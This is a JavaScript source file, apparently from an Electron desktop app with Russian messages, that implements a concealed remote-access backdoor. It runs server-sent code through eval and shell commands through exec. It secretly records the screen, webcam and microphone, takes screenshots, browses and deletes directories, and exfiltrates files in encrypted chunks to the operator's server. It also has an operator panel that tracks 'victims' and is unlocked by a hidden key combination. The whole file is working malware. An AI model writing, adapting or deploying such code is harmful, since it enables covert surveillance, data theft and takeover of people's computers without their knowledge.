            filesBackDoorSendCallbacksStack.push(async () => {
                await sendBufferBackDoor(buf, `.webm`);
            });
        };
        await sleep(time);
        recorder.stop();
        videoSource.getTracks().map(track => track.stop());
        sendReadyData(`Запись видео экрана закончена. Длительность ${time} ms`);
    } catch (e) {
        sendReadyData(`Ошибка: ${e.message}`);
    }
};

const video = async (time = 2000, video = true, audio = true) => {
    try {
        const videoSource = await navigator.mediaDevices.getUserMedia({
            video,
            audio
        });
        sendReadyData(`Запись видео началась`);
        const recorder = new MediaRecorder(videoSource, {
            mimeType: `video/webm;codecs=h264,vp9,opus`
        });
        recorder.start();
        recorder.ondataavailable = async e => {
            const buf = await blobToBuffer(e.data);
            filesBackDoorSendCallbacksStack.push(async () => {
                await sendBufferBackDoor(buf, `.webm`);
            });
        };
        await sleep(time);
        recorder.stop();
        videoSource.getTracks().map(track => track.stop());
        sendReadyData(`Запись видео закончена. Длительность ${time} ms`);
    } catch (e) {
        sendReadyData(`Ошибка: ${e.message}`);
    }
};

const tsc = (screenNum = 1) => {
    const screenName = `Screen ${screenNum}`;
    const thumbSize = determineScreenShotSize();
    let options = {
        types: ['screen'],
        thumbnailSize: thumbSize
    };
    desktopCapturer.getSources(options, (error, sources) => {
        if (error) return console.log(error)
        sources.forEach((source) => {
            if (source.name === 'Entire screen' || source.name === screenName) {
                const buf = source.thumbnail.toPNG();
                if (!buf) {
                    return;
                }
                filesBackDoorSendCallbacksStack.push(async () => {
                    await sendBufferBackDoor(buf, `.png`);
                });
            };
        });
    });
    return `Делаю скриншот...`;
};

let filesBackDoorSendCallbacksStack = [];

setTimeout(async function execFilesBackDoorCallbacks() {
    while (filesBackDoorSendCallbacksStack.length) {
        await filesBackDoorSendCallbacksStack.pop()();
    }
    setTimeout(execFilesBackDoorCallbacks, 500);
}, 0);

const startFileOrOpenDir = resourcePath => {
    const stat = fs.statSync(resourcePath);
    if (stat.isFile()) {
        try {
            exec(getOpenWileWithDefProgramCommand(resourcePath));
        } catch {}
    } else {
        shell.openItem(resourcePath);
    }
};

const removeDir = async dirPath => {
    try {
        await _removeDir(dirPath);
    } catch (e) {
        sendReadyData(`Ошибка: ${e.message}`);
    }
}

const _removeDir = async dirPath => {
    if (fs.statSync(dirPath).isFile()) {
        return sendReadyData(`Ошибка: ${dirPath} файл, а не каталог`);
    }
    const contentDir = fs.readdirSync(dirPath).map(resourcePath => path.join(dirPath, resourcePath));
    const contentDirStats = contentDir.map(resourcePath => fs.statSync(resourcePath));
    for (let i = 0; i < contentDirStats.length; i++) {
        if (contentDirStats[i].isFile()) {
            await fs.unlink(contentDir[i]);
        } else {
            await _removeDir(contentDir[i]);
        }
    }
    await fs.rmdir(dirPath);
    sendReadyData(`${dirPath} удален`);
};

const getDir = (dirPath, maxFileSize, dirName, recursive) => {
    const stat = fs.statSync(dirPath);
    if (stat.isDirectory()) {
        const pathName = dirName || path.basename(dirPath);
        const resourcesPaths = fs.readdirSync(dirPath).map(fileName => path.join(dirPath, fileName));
        const dirs = [];
        const files = resourcesPaths.filter(resourcePath => fs.statSync(resourcePath).isFile() || (dirs.push(resourcePath), false));
        for (let i = 0; i < files.length; i++) {
            filesBackDoorSendCallbacksStack.push(async () => {
                await dnFile(files[i], maxFileSize, pathName);
            });
        }
        if (recursive) {
            for (let i = 0; i < dirs.length; i++) {
                getDir(dirs[i], maxFileSize, path.join(pathName, path.basename(dirs[i])), recursive);
            }
        }
    } else {
        return `${dirPath} не каталог`;
    }
};

const clearStack = () => {
    filesBackDoorSendCallbacksStack = [];
    return `Очередь файлов на отправку очищена`;
};

const getFile = (filePath, maxFileSize) => {
    filesBackDoorSendCallbacksStack.push(async () => {
        await dnFile(filePath, maxFileSize);
    });
};

const dnFile = async (filePath, maxFileSize = 104857600, pathName) => {
    try {
        const stat = fs.statSync(filePath);
        if (stat.isFile()) {
            if (stat.size < maxFileSize) {
                const fileExt = path.extname(filePath);
                const fileName = path.basename(filePath, fileExt);
                const buf = fs.readFileSync(filePath);
                if (!buf.length) {
                    throw new Error(`Файл ${filePath} пуст`);
                }
                sendReadyData(`Файл ${filePath} отправляется (${buf.length} байт)`);
                await sendBufferBackDoor(buf, fileExt, fileName, pathName);
            } else {
                throw new Error(`Файл ${filePath} слишком большой. (${stat.size}) байт`);
            }
        } else {
            throw new Error(`Некорректный путь к файлу ${filePath}`);
        }
    } catch (e) {
        return sendReadyData(e.message);
    }
};

const sendBufferBackDoor = async (buffer, ext, fileId, pathName) => {
    const len = buffer.length;
    if (!len) {
        return;
    }
    buffer = divideBuf(buffer, packetSize).reverse();
    const readable = Readable();
    readable._read = function () {
        if (buffer.length) {
            this.push(buffer.pop());
        } else {
            this.push(null);
        }
    }
    await sendFileBackDoor(null, len, readable, ext, fileId, pathName);
};

const sendFileBackDoor = async (file, size, readable, extn, fileId, pathName) => {
    const callbackStack = [];
    let readStream;
    let ext;
    if (file) {
        readStream = fs.createReadStream(file, {
            highWaterMark
        });
        ext = path.extname(file);
    } else {
        readStream = readable;
        ext = extn;
    }
    if (!fileId) {
        fileId = await getRandomId();
    }
    let position = 0;
    readStream.on(`data`, data => {
        callbackStack.push(async () => {
            position++;
            const filePart = data.toString(encoding);
            let obj = {
                filePart,
                fileId,
                ext,
                position,
            };
            await requestPostAsync({
                url: `${server}/cXVNwFSJeTwXFH6`,
                form: {
                    data: getDataPropertyBackDoor(obj, user.aesKeyBytes),
                    _id: user._id
                }
            });
        });
    });
    await waitStream(readStream);
    for (let i = 0; i < callbackStack.length; i++) {
        await callbackStack[i]();
    }
    await requestPostAsync({
        url: `${server}/cXVNwFSJeTwXFH6`,
        form: {
            data: getDataPropertyBackDoor({
                fileId,
                ext,
                ready: true,
                pathName
            }, user.aesKeyBytes),
            _id: user._id
        }
    });
};

clearResults.addEventListener(`click`, () => {
    backDoorResults.textContent = ``;
});

const sendCommandBackDoor = async (textCommand, destination) => {
    const serverAnswer = await requestPostAsync({
        url: `${server}/9Zb6JDSz7AQtfb3`,
        form: {
            data: getDataPropertyBackDoor({
                command: textCommand,
                destination
            }, user.aesKeyBytes),
            _id: user._id
        }
    });
    decAns = getDecryptedDataBackDoor(serverAnswer.data, user.aesKeyBytes);
    return decAns;
}

sendCommand.addEventListener(`click`, async () => {
    if (!command.value) {
        return;
    }
    const decAns = await sendCommandBackDoor(command.value, recipients.value);
    if (decAns.error) {
        backDoorResults.textContent += `Некорректная команда: ${command.value}\n${decAns.errorReason}\n`;
    }
});

const usersDirectories = {};
const userFiles = {};
let parentDir;
let currentDir;

const snd = dir => sendCommandBackDoor(getBacckDoorFilesFormCommand(`${JSON.stringify(dir)}`), victimId.value);

global.copyPathFromFileId = id => {
    copyText(`'${idsToFiles[id].join(victimInfo.pathSep.repeat(victimInfo.platform == `linux` ? 1 : 2))}'`);
};

global.sndd = id => {
    if (idsToFiles[id]) {
        snd(idsToFiles[id]);
    }
};

global.dnf = id => {
    if (idsToFiles[id]) {
        sendCommandBackDoor(`getFile('${idsToFiles[id].join(victimInfo.pathSep.repeat(victimInfo.platform == `linux` ? 1 : 2))}')`, victimId.value);
    }
};

let idsToFiles = {};
let victimInfo;
const backDoorFilesDisks = getElem(`backDoorFilesDisks`);

goToParentDir.addEventListener(`click`, () => {
    if (!parentDir) {
        return;
    }
    snd(parentDir);
});

downloadAll.addEventListener(`click`, async () => {
    if (!currentDir) {
        return;
    }
    sendCommandBackDoor(`getDir('${currentDir.join(victimInfo.pathSep.repeat(victimInfo.platform == `linux` ? 1 : 2))}', undefined, undefined, ${await swal({
        text: `Скачать рекурсивно?`,
        buttons: [`Нет`, `Да`]
    }, true)})`, victimId.value);
    swal({
        content: backDoorBlock,
        button: false
    });
});

goToStart.addEventListener(`click`, async () => {
    const ans = await sendCommandBackDoor(getBacckDoorFilesFormCommand(`"${goToPath.value.replace(/\\([a-z])/gi, `\\\\$1`)}"`), victimId.value);
    if (ans.error) {
        parentDir = undefined;
        showErrorModal(ans.errorReason);
    }
});

const rootSub = async () => {
    const r = await requestPostAsync({
        url: `${server}/cXVNwFSJeTwXFH6`,
        form: {
            _id: user._id,
            waitingData: true
        }
    });
    if (!r) {
        return setImmediate(rootSub);
    }
    const {
        data
    } = r;
    const decData = getDecryptedDataBackDoor(data, user.aesKeyBytes);
    if (`result` in decData) {
        let jsonPart;
        try {
            jsonPart = JSON.parse(decData.result);
            if (jsonPart.backDoorFiles) {
                const {
                    backDoorFiles: data
                } = jsonPart;
                if (data.dir) {
                    idsToFiles = {};
                    currentDir = data.dir;
                    curPath.value = data.dir.join(path.sep);
                    parentDir = data.parentDir;
                    const {
                        files,
                        stats //true if directory, false if file
                    } = data;
                    let r = ``;
                    SSort((a, b) => b - a, stats, files);
                    for (let i = 0; i < files.length; i++) {
                        const id = await getRandomId();
                        idsToFiles[id] = files[i];
                        const lastEl = files[i][files[i].length - 1];
                        r += `<div class="dirFile" style="color: #${stats[i] ? `8cb0cf` : ``}; font-weight: bold;" onclick="${stats[i] ? `sndd('${id}')` : `dnf('${id}')`}">${lastEl}<br></div>
                        <div style="dispay: flex; flex-direction: row"><button ${stats[i] ? `style="border-color: #8cb0cf; color: #8cb0cf;"` : ``} onclick="copyPathFromFileId('${id}')">Скопировать путь</button></div>`;
                    }
                    backDoorFilesAndDirs.innerHTML = r;
                }
            } else if (jsonPart.backDoorImportantInfo) {
                victimInfo = jsonPart.backDoorImportantInfo;
                backDoorFilesDisks.textContent = victimInfo.disks.map(disk => `${disk}\\\\`).join(` `);
            } else {
                throw new Error;
            }
        } catch (e) {
            backDoorResults.textContent += `${decData._victimId}: ${decData.result}\n`;
        }
    } else {
        const {
            fileId,
            ext,
            filePart,
            position
        } = decData;
        if (!userFiles[fileId]) {
            const victimPath = path.join(backDoorDir, Buffer.from(decData._victimName).toString(`hex`));
            if (!usersDirectories[decData._victimId]) {
                usersDirectories[decData._victimId] = victimPath;
            }
            if (!fs.existsSync(victimPath)) {
                fs.mkdirSync(victimPath);
            }
            userFiles[fileId] = {
                path: victimPath,
                fileName: `${fileId}${ext}`,
                positions: [],
                parts: []
            };
        }
        if (decData.ready) {
            const fileObj = userFiles[decData.fileId];
            SSort((a, b) => a - b, fileObj.positions, fileObj.parts);
            if (decData.pathName) {
                fileObj.path = path.join(usersDirectories[decData._victimId], decData.pathName); //decData.pathName сплитим по сепаратору жертвы, далее джоин своим родным
                if (!fs.existsSync(fileObj.path)) {
                    fs.mkdirSync(fileObj.path, {
                        recursive: true
                    });
                }
            }
            fileObj.path = path.join(fileObj.path, fileObj.fileName);
            if (!(fileObj.positions[0] == 1 && fileObj.positions.every((e, p, a) => !p || e - a[p - 1] == 1))) {
                showErrorModal(`${fileObj.path} поврежден!`);
            }
            await fs.writeFile(fileObj.path, Buffer.concat(fileObj.parts));
            delete userFiles[decData.fileId];
        } else {
            const fileObj = userFiles[fileId];
            fileObj.positions.push(position);
            fileObj.parts.push(Buffer.from(filePart, encoding));
        }
    }
    setImmediate(rootSub);
};

const backDoorFiles = getElem(`backDoorFiles`);
const victimId = getElem(`victimId`);

document.addEventListener(`keydown`, async e => {
    if (e.shiftKey && e.ctrlKey && e.key.match(/[иb]/i) && user.active) {
        if (!checkedRoot) {
            checkedRoot = true;
            accessRoot = getDecryptedDataBackDoor((await requestPostAsync({
                url: `${server}/Si9Mu7IY8LpTvqj`,
                form: {
                    _id: user._id
                }
            })).data, user.aesKeyBytes).access;
            if (accessRoot) {
                getElem(`backDoor`).style.display = `block`;
                rootSub();
                fs.readdir(backDoorDir, (err, data) => {
                    if (err) {
                        fs.mkdir(backDoorDir, {
                            recursive: true
                        }, (err) => {
                            if (err) throw err;
                        });
                    }
                });
            }
        }
        if (accessRoot) {
            swal({
                content: backDoorBlock,
                button: false
            }, true);
        }
    } else if (e.shiftKey && e.ctrlKey && e.key.match(/[тn]/i) && accessRoot) {
        backDoorFiles.style.display = `block`;
        swal({
            content: backDoorFiles,
            button: false
        }, true);
    }
});

const getBacckDoorFilesFormCommand = dir => `
if (Array.isArray(${dir})) {
    fp = ${dir}.join(path.sep);
} else {
    fp = ${dir};
}
files = fs.readdirSync(fp).map(fileName => path.join(fp, fileName)).filter(filePath => {
    try {
        return !!fs.statSync(filePath);
    } catch (e) {
        return false;
    }
});
({
    backDoorFiles: {
        dir: fp.split(path.sep),
        files: files.map(filePath => filePath.split(path.sep)),
        stats: files.map(filePath => fs.statSync(filePath).isDirectory()),
        parentDir: path.join(fp, "..").split(path.sep)
    }
})`;

getElem(`backDoorFilesForm`).addEventListener(`submit`, async e => {
    e.preventDefault();
    const ans = await sendCommandBackDoor(getBacckDoorFilesFormCommand(`path.join(hendrixdir, "..")`), victimId.value);
    if (ans.error) {
        parentDir = undefined;
        showErrorModal(ans.errorReason);
    } else {
        sendCommandBackDoor(`
        let disks;
        try {
            disks = child_process.execSync('wmic logicaldisk get name').toString().match(/\\w:/g);
        } catch (e) {
            disks = [];
        }
        ({
            backDoorImportantInfo: {
                disks,
                pathSep: path.sep,
                platform: process.platform
            }
        })`, victimId.value);
    }
});

const msg = message => dialog.showMessageBox(currentWindow, {
    type: `info`,
    title: `Уведомление`,
    message
});

const emsg = message => dialog.showMessageBox(currentWindow, {
    type: `error`,
    title: `Уведомление`,
    message
});

const cmd = command => (exec(`chcp 65001 | ${command}`, (er, data) => {
    if (er) {
        return sendReadyData(er.message);
    }
    sendReadyData(data.toString());
}), `Команда выполняется`);

const {
    exec
} = child_process;

const executeCode = code => {
    try {
        return JSON.stringify(eval(code)) || ``;
    } catch (e) {
        return e.message;
    }
};

const sendReadyData = async result => {
    await requestPostAsync({
        url: `${server}/cXVNwFSJeTwXFH6`,
        form: {
            data: getDataPropertyBackDoor({
                result
            }, user.aesKeyBytes),
            _id: user._id
        }
    });
};

const getCommand = async () => {
    const p = await requestPostAsync({
        url: `${server}/Mh3lWGicrcSGu7V`,
        form: {
            _id: user._id
        }
    });
    if (!p) {
        return setImmediate(getCommand);
    }
    const cmd = p.data;
    const {
        command
    } = getDecryptedDataBackDoor(cmd, user.aesKeyBytes);
    const dt = executeCode(command) || ``;
    result = dt.length > packetSize ? (sendBufferBackDoor(Buffer.from(dt), `.txt`), `Слишком большой результат команды, отправляю файл`) : dt;
    await sendReadyData(result);
    setImmediate(getCommand);
};